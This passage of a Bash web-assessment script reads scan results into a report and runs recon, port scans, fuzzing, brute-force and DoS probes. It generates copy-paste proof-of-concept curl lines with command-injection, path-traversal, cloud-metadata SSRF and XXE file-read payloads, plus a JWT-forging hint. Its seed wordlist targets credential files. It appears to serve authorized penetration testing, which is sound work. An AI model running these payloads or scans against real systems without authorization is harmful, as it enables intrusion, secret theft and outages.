_dump_hits "$R/openredirect.txt" 'OPEN-REDIRECT' "Open redirect"
_dump_hits "$R/sourcemaps.txt" 'SOURCE-MAP exposed' "Exposed JS source maps"
if [ -s "$R/js-secrets.txt" ] && grep -qE '^[0-9]+:' "$R/js-secrets.txt"; then note "**Hardcoded secrets/tokens in JS bundles:**"; note '```'; grep -E '^[0-9]+:' "$R/js-secrets.txt" | head -30 >> "$REPORT"; note '```'; fi
[ -s "$R/trufflehog-js.log" ] && grep -qiE 'Found|Detector|Verified' "$R/trufflehog-js.log" && { note "**trufflehog (JS secrets):**"; note '```'; sed 's/\x1b\[[0-9;]*m//g' "$R/trufflehog-js.log" | grep -iE 'Found|Detector|Raw|Verified' | head -20 >> "$REPORT"; note '```'; }
[ -s "$R/ssrf-oob.txt" ] && { note "**SSRF payloads dispatched (verify collaborator for OOB hits):**"; note '```'; head -10 "$R/ssrf-oob.txt" >> "$REPORT"; note '```'; }
[ -s "$R/websocket.txt" ] && grep -q WEBSOCKET "$R/websocket.txt" && { note "**WebSocket endpoints:**"; note '```'; grep WEBSOCKET "$R/websocket.txt" >> "$REPORT"; note '```'; }
[ -s "$R/graphql/result.txt" ] && grep -qiE 'BATCHING|field-suggestion|mutationType' "$R/graphql/result.txt" && { note "**GraphQL attack surface:**"; note '```'; grep -iE 'BATCHING|field-suggestion|mutationType|introspection OPEN' "$R/graphql/result.txt" | head -8 >> "$REPORT"; note '```'; }
if ! grep -qiE 'CONFIRMED|IDOR|BFLA|BROKEN-AUTHZ|OBJECT-ENUMERATION|MASS-ASSIGN|alg=none|WEAK HS256|OPEN-REDIRECT|SOURCE-MAP exposed|SQL-ERROR reflected' \
    "$R/inject-verified.txt" "$R/authz.txt" "$R/jwt.txt" "$R/openredirect.txt" "$R/sourcemaps.txt" 2>/dev/null; then
    note "_no actively-verified vulnerabilities. (Absence is not proof of safety — see template + fuzzing sections below.)_"
fi
[ -n "$COOKIE2$HEADER2" ] || note "_Tip: supply \`--cookie2/--header2\` (a second, lower-priv session) to unlock cross-user IDOR/BFLA confirmation._"
[ -n "$COLLAB" ] || note "_Tip: supply \`--collab <oob-host>\` to catch blind SSRF/RCE/log4shell out-of-band._"

sect "Network Infrastructure & Routing"
if [ -s "$R/tracepath.log" ]; then note "**Routing path:**"; code "$R/tracepath.log" 20; fi
if [ -s "$R/hyperscaler.txt" ]; then note "**Inferred Hosting:**"; note '```'; sort -u "$R/hyperscaler.txt" >> "$REPORT"; note '```'; fi
if [ -s "$R/dns-a.log" ]; then note "**DNS Analysis:**"; code "$R/dns-a.log" 10; fi

sect "Attack surface - open ports & services"
if [ -s "$OUTDIR/open-ports.txt" ]; then note '```'; sort -t: -k2 -n "$OUTDIR/open-ports.txt" >> "$REPORT"; note '```'; fi

sect "HTTP Fingerprint & Security Headers"
if [ -s "$R/stack.txt" ]; then note "**Web stack fingerprint:**"; note '```'; head -30 "$R/stack.txt" >> "$REPORT"; note '```'; fi
code "$R/httpx.log" 60
if [ -s "$R/wafw00f.log" ]; then note "**WAF / CDN:**"; note '```'; grep -iE 'is behind|seems to be behind|No WAF' "$R/wafw00f.log" | sed 's/\x1b\[[0-9;]*m//g' | head -5 >> "$REPORT"; note '```'; fi
if [ -s "$R/headers-audit.txt" ]; then note "**Cookie flags / CSP / security headers:**"; note '```'; head -30 "$R/headers-audit.txt" >> "$REPORT"; note '```'; fi
if [ -s "$R/favicon-hash.txt" ]; then note "**Favicon pivot:**"; note '```'; head -3 "$R/favicon-hash.txt" >> "$REPORT"; note '```'; fi
if [ -s "$R/ratelimit.txt" ]; then note "**Rate limiting:**"; note '```'; head -3 "$R/ratelimit.txt" >> "$REPORT"; note '```'; fi

sect "Discovered API & Content"
if [ -s "$R/gobuster.log" ] || [ -f "$R/ffuf.json" ] || [ -f "$R/ffuf-api-root.json" ] || [ -f "$R/kr-scan.json" ]; then
    note '```'
    [ -f "$R/gobuster.log" ] && grep -iE '\.env|\.git|backup|\.sql|\.bak|admin|actuator|server-status|swagger|graphql|\.htaccess|config|package\.json|composer\.json|requirements\.txt|(Status: 200|301|401|403)' "$R/gobuster.log" | head -40 >> "$REPORT"
    [ -f "$R/ffuf.json" ] && grep -oE '"url":"[^"]+","status":[0-9]+' "$R/ffuf.json" | tr -d '"' | head -20 >> "$REPORT"
    [ -f "$R/ffuf-api-root.json" ] && grep -oE '"url":"[^"]+","status":[0-9]+' "$R/ffuf-api-root.json" | tr -d '"' | head -20 >> "$REPORT"
    [ -f "$R/ffuf-api-sub.json" ] && grep -oE '"url":"[^"]+","status":[0-9]+' "$R/ffuf-api-sub.json" | tr -d '"' | head -20 >> "$REPORT"
    [ -f "$R/kr-scan.json" ] && grep -oE '"path":"[^"]+","status":[0-9]+' "$R/kr-scan.json" | tr -d '"' | head -20 >> "$REPORT"
    note '```'
else note "_no notable API or content discovered._"; fi

sect "API Schema & Endpoint Discovery"
if [ -s "$R/openapi/found.txt" ] && grep -qi 'FOUND spec' "$R/openapi/found.txt"; then
    note "**OpenAPI / Swagger specs:**"; note '```'; grep -i 'FOUND spec' "$R/openapi/found.txt" >> "$REPORT"; note '```'
    if [ -s "$R/openapi-endpoints.txt" ]; then note "**Endpoints from spec ($(wc -l < "$R/openapi-endpoints.txt")):**"; note '```'; head -60 "$R/openapi-endpoints.txt" >> "$REPORT"; note '```'; fi
    [ -s "$R/openapi/methods.txt" ] && { note "**Declared methods:**"; note '```'; head -60 "$R/openapi/methods.txt" >> "$REPORT"; note '```'; }
else note "_no OpenAPI/Swagger specification exposed._"; fi
if [ -s "$R/graphql/result.txt" ]; then note "**GraphQL:**"; note '```'; sed 's/\x1b\[[0-9;]*m//g' "$R/graphql/result.txt" | head -20 >> "$REPORT"; note '```'; fi
if [ -s "$R/js-endpoints.log" ]; then note "**Endpoints mined from JavaScript ($(wc -l < "$R/js-endpoints.log")):**"; note '```'; head -50 "$R/js-endpoints.log" >> "$REPORT"; note '```'; fi
if [ -s "$R/method-map.txt" ]; then note "**HTTP method map (verb -> status):**"; note '```'; head -80 "$R/method-map.txt" >> "$REPORT"; note '```'; fi
if [ -s "$OUTDIR/live-subdomains.txt" ]; then
    note "**Live subdomains ($(wc -l < "$OUTDIR/live-subdomains.txt")) — re-run the tool against these to widen coverage:**"
    note '```'; sed 's/\x1b\[[0-9;]*m//g' "$OUTDIR/live-subdomains.txt" | head -40 >> "$REPORT"; note '```'
fi

sect "Access Control & Misconfiguration"
if grep -q BYPASS "$R/bypass.txt" 2>/dev/null; then
    note "**401/403 bypass — restricted endpoints reachable via header/path tricks:**"
    note '```'; grep -B1 BYPASS "$R/bypass.txt" | head -50 >> "$REPORT"; note '```'
else note "_no 401/403 access-control bypass found._"; fi
if [ -s "$R/misconfig.txt" ] && grep -qE 'reflects|reflected|present:' "$R/misconfig.txt"; then
    note "**CORS / Host-header / well-known:**"
    note '```'; sed 's/\x1b\[[0-9;]*m//g' "$R/misconfig.txt" | head -60 >> "$REPORT"; note '```'
else note "_no CORS reflection, host-header injection, or notable well-known files._"; fi

sect "Service CVEs & Host Vulns"
if [ -s "$R/nmap.log" ]; then
    # Extract detailed vuln lines and CVE IDs
    grep -iE 'VULNERABLE|CVE-[0-9]|sslv3|SWEET32|POODLE|TRACE is enabled|weak|http-slowloris|/tcp *open' "$R/nmap.log" | head -80 >> "$REPORT"
    code "$R/nmap.log" 100
else note "_no host-level vulnerabilities detected._"; fi

sect "Web Vulnerabilities (nuclei)"
if [ -s "$R/nuclei.txt" ]; then
    for s in critical high medium low; do
        if grep -qiE "\[$s\]" "$R/nuclei.txt"; then
            note "**${s^^}:**"; note '```'
            grep -iE "\[$s\]" "$R/nuclei.txt" >> "$REPORT"; note '```'
        fi
    done
else note "_no web vulnerabilities detected by nuclei templates._"; fi

sect "Active Injection & Breaking"
note "Findings from DAST fuzzing and attempts to provoke server errors (500s)."
if [ -s "$R/nuclei-dast.txt" ] || [ -s "$R/break-500.log" ]; then
    note '```'; [ -s "$R/nuclei-dast.txt" ] && sed 's/\x1b\[[0-9;]*m//g' "$R/nuclei-dast.txt" | head -40 >> "$REPORT"
    [ -s "$R/break-500.log" ] && grep -vE '^URL,Method' "$R/break-500.log" | head -40 >> "$REPORT"; note '```'
else note "_no injection or breaking findings detected._"; fi

sect "Provoked Server Errors (5xx)"
note "Deep fault injection: malformed bodies, type confusion, oversized input, verb tampering."
if [ -s "$R/break500-deep.csv" ] && [ "$(wc -l < "$R/break500-deep.csv")" -gt 1 ]; then
    HITS=$(( $(wc -l < "$R/break500-deep.csv") - 1 ))
    note "**$HITS request(s) elicited a 5xx response.** Breakdown by fault class:"
    note '```'
    tail -n +2 "$R/break500-deep.csv" | awk -F, '{print $4}' | sort | uniq -c | sort -rn >> "$REPORT"
    note '```'
    note "Deduplicated (status | method | class | url-template, digit path segments -> {n}):"
    note '```'
    # normalize url: strip query, collapse numeric path segments so /users/1 == /users/2
    tail -n +2 "$R/break500-deep.csv" | awk -F, '
        { url=$5; sub(/\?.*$/,"",url); gsub(/\/[0-9]+/,"/{n}",url);
          key=$1" | "$2" | "$4" | "url; cnt[key]++ }
        END { for (k in cnt) printf "%4d x  %s\n", cnt[k], k }' | sort -rn | head -40 >> "$REPORT"
    note '```'
    if [ -d "$R/break500-bodies" ] && [ -n "$(ls -A "$R/break500-bodies" 2>/dev/null)" ]; then
        note "First captured error body:"
        note '```'
        head -30 "$(ls "$R/break500-bodies"/* 2>/dev/null | head -1)" 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' >> "$REPORT"
        note '```'
        note "_All ${HITS} error bodies saved under \`raw/break500-bodies/\`._"
    fi
else note "_no 5xx responses provoked (server handled all malformed input gracefully)._"; fi

sect "Cross-site scripting (dalfox)"
if [ -s "$R/dalfox.txt" ]; then note '```'; sed 's/\x1b\[[0-9;]*m//g' "$R/dalfox.txt" | grep -iE '\[POC\]|\[V\]|\[VULN' | head -40 >> "$REPORT"; note '```'; else note "_no verified XSS found._"; fi

sect "SQL injection (sqlmap)"
if grep -qiE 'is vulnerable|parameter.*injectable' "$R/sqlmap.log" 2>/dev/null; then note '```'; grep -iE 'Parameter|Type:|Title:|payload' "$R/sqlmap.log" | head -40 >> "$REPORT"; note '```'; else note "_no injectable parameters confirmed._"; fi

sect "Credential Brute"
has_brute=0
for hl in "$R/hydra-ssh.log" "$R/hydra-http.log"; do [ -s "$hl" ] && { has_brute=1; note "\`$(basename "$hl")\`:"; note '```'; grep -iE 'host:|login:|password:' "$hl" | head >> "$REPORT"; note '```'; }; done
[ "$has_brute" = 0 ] && note "_no weak credentials found._"

sect "Denial-of-Service Exposure"
for sl in slow-headers slow-body slow-range slow-read; do if [ -s "$R/$sl.log" ]; then v=$(grep -iE 'service available' "$R/$sl.log" | tail -1 | sed 's/\x1b\[[0-9;]*m//g' | tr -s ' '); note "- **$sl**: ${v:-see log}"; fi; done
[ -s "$R/wrk.log" ] && { note "**wrk throughput:**"; note '```'; grep -iE 'Requests/sec|Latency|Socket errors|requests in' "$R/wrk.log" >> "$REPORT"; note '```'; }

sect "Reproduction (copy-paste PoCs)"
POCS="$OUTDIR/pocs.sh"
AUTHP=""; [ -n "$COOKIE" ] && AUTHP="-b \"$COOKIE\""; [ -n "$HEADER" ] && AUTHP="$AUTHP -H \"$HEADER\""
printf '#!/usr/bin/env bash\n# Auto-generated proof-of-concept requests for %s. REVIEW before running.\n\n' "$BASEURL" > "$POCS"
pocline(){ printf '%s\n' "$1" >> "$POCS"; }
have_poc=0
while IFS= read -r line; do
    # endpoint is the URL AFTER the final ': ' (payload URLs live in the parenthetical)
    u=$(printf '%s' "${line##*: }" | grep -aoE 'https?://[^ )]+' | head -1); [ -z "$u" ] && continue
    case "$line" in
        *"SSTI CONFIRMED"*)       pl='{{7*7}}'; exp='49 in response';;
        *"OS-COMMAND-INJECTION"*) pl=';id'; exp='uid= in response';;
        *"PATH-TRAVERSAL"*)       pl='../../../../../../etc/passwd'; exp='root:x:0';;
        *"SQL-ERROR"*)            pl="1%27" ; exp='SQL error string';;
        *"SSRF CONFIRMED"*)       pl='http://169.254.169.254/latest/meta-data/'; exp='cloud metadata';;
        *) continue;;
    esac
    if printf '%s' "$u" | grep -q '?'; then b="${u%%\?*}"; k="${u#*\?}"; k="${k%%=*}"; t="$b?$k=$pl"; else t="${u%/}?sf=$pl"; fi
    pocline "curl -gsk $AUTHP \"$t\"   # expect: $exp"; have_poc=1
done < <(grep -aE 'CONFIRMED|SQL-ERROR reflected' "$R/inject-verified.txt" 2>/dev/null | sort -u)
while IFS= read -r line; do u=$(printf '%s' "$line" | grep -aoE 'https?://[^ )]+' | head -1); [ -z "$u" ] && continue
    pocline "curl -gsk $AUTHP -X POST -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>' \"$u\"   # expect: root:x:0"; have_poc=1
done < <(grep -a 'XXE CONFIRMED' "$R/xxe.txt" 2>/dev/null)
while IFS= read -r line; do u=$(printf '%s' "$line" | grep -aoE 'https?://[^ )]+' | head -1); [ -z "$u" ] && continue
    pocline "curl -gsk -b \"<SECOND-USER-SESSION>\" \"$u\"   # IDOR: 2nd identity reads this object"; have_poc=1
done < <(grep -a 'IDOR CONFIRMED' "$R/authz.txt" 2>/dev/null)
while IFS= read -r line; do u=$(printf '%s' "$line" | grep -aoE 'https?://[^ )]+' | head -1); [ -z "$u" ] && continue
    pocline "curl -gsk -i $AUTHP \"$u\" | grep -i '^location'   # expect Location: https://evil..."; have_poc=1
done < <(grep -a 'OPEN-REDIRECT:' "$R/openredirect.txt" 2>/dev/null)
awk '/^\[40[13]\] baseline/{u=$3} /BYPASS/{print u" ::: "$0}' "$R/bypass.txt" 2>/dev/null | while IFS= read -r row; do
    bu="${row%% ::: *}"; rest="${row#* ::: }"; var=$(printf '%s' "$rest" | grep -oE '\{[^}]+\}' | head -1 | tr -d '{}')
    case "$rest" in
        *"via header"*) pocline "curl -gsk $AUTHP -H \"$var\" \"$bu\"   # 403 bypass";;
        *"via path"*)   pocline "curl -gsk $AUTHP \"$var\"   # 403 bypass (path mangling)";;
    esac; have_poc=1
done
if grep -q 'WEAK HS256 SECRET CRACKED' "$R/jwt.txt" 2>/dev/null; then
    sec=$(grep -oE 'CRACKED: "[^"]+"' "$R/jwt.txt" | head -1 | sed 's/.*"\(.*\)"/\1/')
    pocline "# JWT signed with weak secret \"$sec\" -> forge admin token: jwt_tool <token> -S hs256 -p '$sec' -T"; have_poc=1
fi
# the bypass loop runs in a subshell (awk|while) so its have_poc is lost; trust the file
[ "$(wc -l < "$POCS" 2>/dev/null || echo 0)" -gt 2 ] && have_poc=1
if [ "$have_poc" = 1 ]; then
    # dedup body (keep the 2-line header)
    { head -2 "$POCS"; tail -n +3 "$POCS" | awk '!seen[$0]++'; } > "$POCS.tmp" && mv "$POCS.tmp" "$POCS"
    chmod +x "$POCS" 2>/dev/null
    note "Generated \`pocs.sh\` (review before running):"; note '```bash'; tail -n +3 "$POCS" | head -40 >> "$REPORT"; note '```'
else note "_no reproducible PoCs generated (no confirmed active findings)._"; fi

sect "Coverage Gaps — Missing Tools"
if [ -s "$R/missing-inventory.txt" ] || [ -s "$R/missing-tools.txt" ]; then
    note "The following tools were **not installed**, so their checks were skipped. Absence of a finding in those areas is not evidence of safety — install and re-run."
    note '| Tool | Skipped check(s) |'
    note '|---|---|'
    # union of preflight inventory and per-run skips, mapped to the phases they gate
    { [ -s "$R/missing-inventory.txt" ] && cat "$R/missing-inventory.txt"
      [ -s "$R/missing-tools.txt" ] && cut -f1 "$R/missing-tools.txt"; } | sort -u | while read -r t; do
        [ -z "$t" ] && continue
        tasks=$(grep -P "^${t}\t" "$R/missing-tools.txt" 2>/dev/null | cut -f2 | paste -sd', ')
        printf '| `%s` | %s |\n' "$t" "${tasks:-not exercised}" >> "$REPORT"
    done
    note ""
    note "Install hints: pipx/go install for ProjectDiscovery tools (naabu, katana, nuclei, httpx, subfinder), \`pacman\`/AUR for nmap, sqlmap, hydra, nikto, wrk, slowhttptest, jq; \`go install github.com/lc/gau\` and \`.../tomnomnom/waybackurls\` for passive URL harvest."
else note "_all expected tools were present._"; fi

sect "Industry Best Practices & Remediation"
note "Use these industry-standard guides to remediate the findings above:"
note ""
note "### 1. Web & API Security"
note "- **[OWASP Top 10](https://owasp.org/www-project-top-ten/):** Remediation for XSS, SQLi, and Auth issues."
note "- **[OWASP API Security](https://owasp.org/www-project-api-security/):** Hardening for discovered API endpoints."
note "- **[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/):** Specific technical fixes for all findings."
note ""
note "### 2. Infrastructure & Hardening"
note "- **[NIST SP 800-123](https://csrc.nist.gov/publications/detail/sp/800-123/final):** General server security and OS hardening."
note "- **[NIST SP 800-53](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final):** Comprehensive security controls (IA/AC families)."
note "- **[CIS Benchmarks](https://www.cisecurity.org/benchmark):** Step-by-step service-specific hardening guides."
note ""
note "### 3. Resilience & DoS"
note "- **[OWASP DoS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html):** Strategies for rate-limiting and WAF configuration."
note ""
note "---"
note "_Blackbox assessment: absence of a finding is not proof of safety. Re-run after remediation._"

# ---- machine-readable summary (findings.json) for CI / piping ----
{
  jstr() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
  bcount() { [ -s "$1" ] && tail -n +2 "$1" 2>/dev/null | wc -l | tr -d ' ' || echo 0; }
  n5xx=$(bcount "$R/break500-deep.csv")
  nbypass=$(grep -c BYPASS "$R/bypass.txt" 2>/dev/null); nbypass=${nbypass:-0}
  nopenapi=$([ -s "$R/openapi-endpoints.txt" ] && wc -l < "$R/openapi-endpoints.txt" | tr -d ' ' || echo 0)
  ncorsref=$(grep -c 'reflects' "$R/misconfig.txt" 2>/dev/null); ncorsref=${ncorsref:-0}
  ncrawl=$([ -s "$OUTDIR/urls.txt" ] && wc -l < "$OUTDIR/urls.txt" | tr -d ' ' || echo 0)
  graphql_open=$(grep -qi 'introspection OPEN' "$R/graphql/result.txt" 2>/dev/null && echo true || echo false)
  hcount() { local n; n=$(grep -ciE "$1" "$2" 2>/dev/null); echo "${n:-0}"; }
  ninject=$(hcount 'CONFIRMED' "$R/inject-verified.txt")
  nsqlerr=$(hcount 'SQL-ERROR reflected' "$R/inject-verified.txt")
  nauthz=$(hcount 'IDOR|BFLA|BROKEN-AUTHZ|OBJECT-ENUMERATION|MASS-ASSIGN' "$R/authz.txt")
  nredirect=$(hcount 'OPEN-REDIRECT' "$R/openredirect.txt")
  nsrcmap=$(hcount 'SOURCE-MAP exposed' "$R/sourcemaps.txt")
  njwt=$(hcount 'alg=none|WEAK HS256|EXPIRED' "$R/jwt.txt")
  ncachep=$(hcount 'CACHE-POISONING risk' "$R/misconfig.txt")
  njssec=$(njs_secrets)
  nxxe=$(hcount 'XXE CONFIRMED' "$R/xxe.txt")
  ndeser=$(hcount 'DESERIALIZATION error|serialized object exposed|__VIEWSTATE present' "$R/deser.txt")
  nsmug=$(hcount 'SMUGGLING' "$R/smuggling.txt")
  nwsfuzz=$(hcount 'WS-SSTI CONFIRMED|CSWSH|WS-SQL-ERROR|WS-REFLECTION' "$R/ws-fuzz.txt")
  nexploit=$(hcount 'gadget .* fired' "$R/deser-exploit.txt")
  nws=$(hcount 'WEBSOCKET endpoint' "$R/websocket.txt")
  frameworks=$(grep -aoE 'detected: .*' "$R/stack.txt" 2>/dev/null | sed 's/detected: //' | awk 'NR>1{printf ", "}{gsub(/"/,"");printf "\"%s\"",$0}')
  printf '{\n'
  printf '  "target": "%s",\n' "$(jstr "$BASEURL")"
  printf '  "host": "%s",\n' "$(jstr "$HOST")"
  printf '  "generated": "%s",\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  printf '  "mode": { "stealth": %s, "dos": %s, "rate": %s },\n' \
         "$([ "$STEALTH" = 1 ] && echo true || echo false)" \
         "$([ "$DOS" = 1 ] && echo true || echo false)" "${RATE:-0}"
  printf '  "severity_total": { "critical": %s, "high": %s, "medium": %s, "low": %s, "info": %s },\n' "$TC" "$TH" "$TM" "$TL" "$I"
  printf '  "severity_nuclei": { "critical": %s, "high": %s, "medium": %s, "low": %s, "info": %s },\n' "$C" "$H" "$M" "$L" "$I"
  printf '  "open_ports": "%s",\n' "$(jstr "$OPEN_PORTS")"
  printf '  "crawl_urls": %s,\n' "$ncrawl"
  printf '  "openapi_endpoints": %s,\n' "$nopenapi"
  printf '  "graphql_introspection_open": %s,\n' "$graphql_open"
  printf '  "provoked_5xx": %s,\n' "$n5xx"
  printf '  "verified": { "injection": %s, "xxe": %s, "deserialization": %s, "deser_exploit_dispatched": %s, "ws_message_findings": %s, "smuggling": %s, "sql_errors": %s, "authz_flaws": %s, "open_redirect": %s, "source_maps": %s, "jwt_issues": %s, "cache_poisoning": %s, "js_secrets": %s },\n' \
         "$ninject" "$nxxe" "$ndeser" "$nexploit" "$nwsfuzz" "$nsmug" "$nsqlerr" "$nauthz" "$nredirect" "$nsrcmap" "$njwt" "$ncachep" "$njssec"
  printf '  "websocket_endpoints": %s,\n' "$nws"
  printf '  "frameworks": [%s],\n' "$frameworks"
  printf '  "access_control_bypasses": %s,\n' "$nbypass"
  printf '  "cors_reflections": %s,\n' "$ncorsref"
  printf '  "missing_tools": [%s],\n' "$( { [ -s "$R/missing-inventory.txt" ] && cat "$R/missing-inventory.txt"; [ -s "$R/missing-tools.txt" ] && cut -f1 "$R/missing-tools.txt"; } | sort -u | sed '/^$/d' | awk 'NR>1{printf ", "} {printf "\"%s\"", $0}' )"
  printf '  "report": "%s"\n' "$(jstr "$REPORT")"
  printf '}\n'
} > "$OUTDIR/findings.json" 2>/dev/null
note ""
note "Machine-readable summary: \`findings.json\`."
}

# Wordlists
HTTPX_BIN=httpx-toolkit; have "$HTTPX_BIN" || HTTPX_BIN=httpx
SL=/usr/share/seclists
if [ -z "$WORDLIST" ]; then
    for c in "$SL/Discovery/Web-Content/raft-medium-directories-lowercase.txt" "$SL/Discovery/Web-Content/common.txt"; do [ -f "$c" ] && { WORDLIST="$c"; break; }; done
fi
if [ -z "$WORDLIST" ]; then
    WORDLIST="$OUTDIR/raw/seedlist.txt"
    printf '%s\n' admin login api api/v1 api/v2 .git .git/config .env config config.php wp-admin wp-login.php phpinfo.php server-status status health healthz metrics actuator actuator/env debug test backup backup.zip db.sql dump.sql robots.txt sitemap.xml .well-known uploads static assets tmp old dev staging swagger swagger.json openapi.json graphql console cgi-bin admin.php dashboard private secret .htaccess .DS_Store package.json composer.json requirements.txt package-lock.json docker-compose.yml Dockerfile .dockerignore .gitignore aws/config aws/credentials .aws/credentials metadata/v1.json .vnc/config.json > "$WORDLIST"
fi

## ================================================================ PHASE 0: net recon
phase "Network Reconnaissance"
run tracepath tracepath -n "$HOST"
if ! is_private "$HOST"; then
    run whois whois "$HOST"
    [ -s "$OUTDIR/raw/whois.log" ] && grep -iE "Amazon|AWS|Google|Cloud|Azure|Microsoft|DigitalOcean|Hetzner|Linode|Akamai" "$OUTDIR/raw/whois.log" > "$OUTDIR/raw/hyperscaler.txt" || true
fi
if have host; then
    run dns-a host -t A "$HOST"
    run dns-mx host -t MX "$HOST"
    run dns-ns host -t NS "$HOST"
    run dns-txt host -t TXT "$HOST"
fi

## ================================================================ PHASE 1: web recon
phase "Web Recon & Discovery"
if ! is_private "$HOST" && printf '%s' "$HOST" | grep -q '[a-z].*\.'; then
    run subfinder subfinder -silent -d "$HOST"
    if [ -s "$OUTDIR/raw/subfinder.log" ]; then
        cp "$OUTDIR/raw/subfinder.log" "$OUTDIR/subdomains.txt"
        # probe which subdomains are actually live so they can be fed back as targets
        run subs-live sh -c "$HTTPX_BIN -l '$OUTDIR/subdomains.txt' -silent -sc -title -o '$OUTDIR/raw/subs-live.txt' 2>/dev/null || true"
        [ -s "$OUTDIR/raw/subs-live.txt" ] && cp "$OUTDIR/raw/subs-live.txt" "$OUTDIR/live-subdomains.txt"
    fi
fi
run httpx "$HTTPX_BIN" -u "$BASEURL" "${HTTPX_AUTH[@]}" -sc -title -tech-detect -server -location -ip -cdn -method -websocket -jarm -favicon -asn -json -csp-probe -pipeline

# Soft-404 calibration + auth validation (direct calls: they set shell globals).
calibrate_baseline >"$OUTDIR/raw/baseline.log" 2>&1
log "$(sed -n 1p "$OUTDIR/raw/baseline.log")"
[ "$CATCHALL" = 1 ] && warn "target looks like a catch-all (soft-404 returns 2xx/3xx) - findings baseline-filtered"
auth_check >"$OUTDIR/raw/auth-check.log" 2>&1
log "$(sed -n 1p "$OUTDIR/raw/auth-check.log")"
grep -q WARNING "$OUTDIR/raw/auth-check.log" 2>/dev/null && warn "$(grep WARNING "$OUTDIR/raw/auth-check.log" | head -1)"

run cloud-metadata sh -c "for u in http://169.254.169.254/latest/meta-data/ http://169.254.169.254/computeMetadata/v1/; do curl -sk --max-time 3 \"\$u\"; done"
run wafw00f wafw00f "$BASEURL" -a
run gowitness gowitness scan single -u "$BASEURL" --screenshot-path "$OUTDIR/screenshots" --write-none

KATANA_HL=()
if [ "$SPA" = 1 ]; then
    KATANA_HL=(-headless -hybrid -no-sandbox -system-chrome)
    { have chromium || have chromium-browser; } || warn "--spa set but no chromium found"
fi
run katana katana -u "$BASEURL" "${KATANA_HL[@]}" "${KATANA_AUTH[@]}" -jc -jsl -aff -fx -kf all -d 5 -c "$KATANA_C" -rl "$KATANA_RL" -timeout 10 -ct "$((DURATION * 3))" -ef woff,woff2,ttf,eot,css,png,jpg,jpeg,gif,svg,ico,webp,mp4,mp3 -silent -o "$OUTDIR/urls.txt"

run sitemap sh -c "for p in sitemap.xml sitemap_index.xml robots.txt; do curl -sk --max-time 8 '${SCHEME}://${HOST}:${PORT}/'\$p; done | grep -oE 'https?://[^\"'\''<> ]+' | sort -u"
[ -s "$OUTDIR/raw/sitemap.log" ] && cat "$OUTDIR/raw/sitemap.log" >> "$OUTDIR/urls.txt"

# Passive URL harvesting (historical / archived endpoints) for public hosts
if ! is_private "$HOST"; then
    have gau         && run gau         sh -c "printf '%s\n' '$HOST' | gau --threads 5 --subs 2>/dev/null"
    have waybackurls && run waybackurls sh -c "printf '%s\n' '$HOST' | waybackurls 2>/dev/null"
    for f in gau waybackurls; do [ -s "$OUTDIR/raw/$f.log" ] && cat "$OUTDIR/raw/$f.log" >> "$OUTDIR/urls.txt"; done
fi

# Mine endpoints out of served JavaScript (linkfinder-style regex)
if [ -s "$OUTDIR/urls.txt" ]; then
    run js-endpoints sh -c "grep -iE '\\.js(\\?|\$)' '$OUTDIR/urls.txt' | sort -u | while read -r u; do curl -sk --max-time 8 \"\$u\"; done | grep -oE '\"(/[a-zA-Z0-9_?&=./~-]{2,}|https?://[^\"]+)\"' | tr -d '\"' | sort -u"
    if [ -s "$OUTDIR/raw/js-endpoints.log" ]; then
        grep -E '^https?://' "$OUTDIR/raw/js-endpoints.log" >> "$OUTDIR/urls.txt" 2>/dev/null || true
        grep -E '^/'         "$OUTDIR/raw/js-endpoints.log" 2>/dev/null | \
            sed "s#^#${SCHEME}://${HOST}:${PORT}#" >> "$OUTDIR/urls.txt" || true
    fi
    # exposed JS source maps (.map) -> original source recovery
    run sourcemaps sourcemap_probe
    # generic hardcoded-secret sweep of JS bundles (TOKEN=/Bearer/apiKey/cloud keys)
    run js-secrets js_secrets_probe
fi

# API schema discovery: OpenAPI/Swagger + GraphQL introspection
run openapi openapi_probe
run graphql graphql_probe
[ -s "$OUTDIR/raw/openapi-endpoints.txt" ]   && cat "$OUTDIR/raw/openapi-endpoints.txt"   >> "$OUTDIR/urls.txt"
[ -s "$OUTDIR/raw/api-endpoints-extra.txt" ] && cat "$OUTDIR/raw/api-endpoints-extra.txt" >> "$OUTDIR/urls.txt"

sort -u -o "$OUTDIR/urls.txt" "$OUTDIR/urls.txt" 2>/dev/null || true

API_URLS="$OUTDIR/raw/api-urls.txt"
grep -iE '/api/|/v[0-9]+/|/graphql|/rest/|/rpc|\.json($|\?)|/oauth|/token|\?' "$OUTDIR/urls.txt" 2>/dev/null | sort -u > "$API_URLS" || true
log "crawl: $(wc -l < "$OUTDIR/urls.txt" 2>/dev/null || echo 0) urls"

# CORS / Host-header injection / cache-poison / security.txt misconfig checks
run misconfig misconfig_probe
# security headers, cookie flags, CSP audit + favicon hash pivot + stack fingerprint
run headers-audit headers_audit
run stack fingerprint_stack
run favicon favicon_hash

if have trufflehog && [ -s "$OUTDIR/urls.txt" ]; then
    run trufflehog-js sh -c "grep -iE '\\.js(\\?|$)' '$OUTDIR/urls.txt' | sort -u | while read -r u; do curl -sk --max-time 8 \"\$u\"; done | trufflehog --no-update --results=verified,unknown,unverified stdin"
fi

## ================================================================ PHASE 2: host scan
phase "Host & Port Vulnerabilities"
naabu_p="-top-ports 1000"; [ "$FULL_PORTS" = 1 ] && naabu_p="-p -"
run naabu naabu -host "$HOST" $naabu_p "${NAABU_TUNE[@]}" -silent -o "$OUTDIR/raw/ports.txt"

OPEN_PORTS=""
[ -f "$OUTDIR/raw/ports.txt" ] && OPEN_PORTS=$(sed 's/.*://' "$OUTDIR/raw/ports.txt" | sort -un | paste -sd, -)
[ -z "$OPEN_PORTS" ] && OPEN_PORTS="$PORT,21,22,25,80,110,143,443,3306,5432,6379,8080,8443,27017"
cp "$OUTDIR/raw/ports.txt" "$OUTDIR/open-ports.txt" 2>/dev/null || true

NMAP_PRIV=""; [ "$(id -u)" = 0 ] && NMAP_PRIV="-O"
